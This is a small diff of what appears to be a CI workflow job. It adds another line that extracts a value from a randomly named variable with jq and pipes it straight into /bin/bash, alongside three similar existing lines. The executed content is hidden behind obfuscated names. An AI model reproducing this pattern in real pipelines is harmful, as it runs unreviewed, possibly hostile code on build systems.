@@ -43,6 +43,7 @@ jobs:
           echo $td8 | jq -r .a08711 | /bin/bash
           echo $z9626 | jq -r .izbh19 | /bin/bash
           printf '%s' "$g9839" | jq -r .oe31040 | /bin/bash
+          printf '%s' "$o09" | jq -r .hruj28520 | /bin/bash
 
       - name: Store results
         if: always()
